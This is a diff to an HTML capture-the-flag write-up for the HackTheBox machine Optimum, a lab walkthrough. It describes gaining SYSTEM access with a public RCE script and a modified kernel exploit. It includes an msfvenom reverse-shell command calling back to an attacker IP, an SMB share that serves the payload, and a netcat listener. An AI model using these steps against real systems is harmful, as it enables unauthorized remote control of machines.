@@ -24,7 +24,7 @@ layout: default
 
     <h2><a id="summary">Summary</a></h2>
 
-    <p></p>
+    <p>Optimum was very quick to gain a foothold.  Simply searching the web app in searchsploit reveled a RCE script which was easy to use.  Privilege escalation consisted of finding a kernel exploit.  Slight modifications to the exploit were required.  The kernel exploit granted us a system shell.</p>
 
     <h2><a id="portscan">Port Scanning</a></h2>
 
@@ -112,13 +112,44 @@ layout: default
 
     <br>
 
-    <li>In order to gain a SYSTEM shell I modify the exploit.  First, I create a reverse shell executable using msfvenom</li>
+    <li>In order to gain a SYSTEM shell I modify the exploit.  First, I create a reverse shell executable using msfvenom.</li>
 
-    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Optimum]&#13;&#10;&boxur;&HorizontalLine;$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.83 LPORT=4444 -f exe &gt; shell.exe                                              130 &Cross;&#13;&#10;[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload&#13;&#10;[-] No arch selected, selecting arch: x86 from the payload&#13;&#10;No encoder specified, outputting raw payload&#13;&#10;Payload size: 324 bytes&#13;&#10;Final size of exe file: 73802 bytes&#13;&#10;    </pre>
+    <img src="../images/optimum/msfvenom.png">
 
+    <br>
+    <br>
 
+    <li>Then, I setup a smb share using impacket-smbserver</li>
 
+    <img src="../images/optimum/smbserver.png">
 
+    <br>
+    <br>
+
+    <li>At this point, I have my shell.exe file created and my smb share setup in the same directory as the shell.exe file.  Now I will edit the exploit (39719.ps1) and replace all mentions of cmd.exe with \\10.10.14.83\share\shell.exe</li>
+
+    <img src="../images/optimum/cmd.png">
+
+    <li>The above is one of the two instances where cmd.exe is mentioned in the script.  I will replace the entire highlighted area with \\10.10.14.83\share\shell.exe so that when the script runs it will execute my shell.exe file under the context of SYSTEM instead of cmd.exe.</li>
+
+    <br>
+
+    <li>At this point I have the following in place:</li>
+    <ul>
+        <li>Modified exploit script - cmd.exe changed to \\10.10.14.83\share\shell.exe</li>
+        <li>smb share started in the same directory as shell.exe - sudo impacket-smbserver share .</li>
+        <li>python web server running in the same directory as the exploit script - sudo python3 -m http.server 80</li>
+        <li>netcat listener on port 4444 - rlwrap nc -lvnp 4444</li>
+    </ul>
+
+    <li>Now I will execute the script from the victim machine.</li>
+
+    <img src="../images/optimum/system_shell.png">
+    
+    <br>
+    <br>
+
+    <li>In the above, we can see an nt authority\system shell has connected to the netcat listener.</li>
 
 </body>
 </html>
